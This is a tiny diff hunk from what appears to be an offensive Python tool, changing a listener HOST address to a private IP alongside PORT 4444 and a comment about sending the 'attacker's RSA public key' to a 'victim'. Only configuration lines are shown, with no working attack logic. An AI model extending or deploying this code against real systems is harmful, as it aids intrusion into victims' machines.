@@ -3,7 +3,7 @@ from datetime import datetime
 import os
 
 LOG_FILE = "logs.txt"
-HOST = "10.151.192.27"
+HOST = "192.168.1.187"
 PORT = 4444
 
 # Load attacker's RSA public key to send to victim
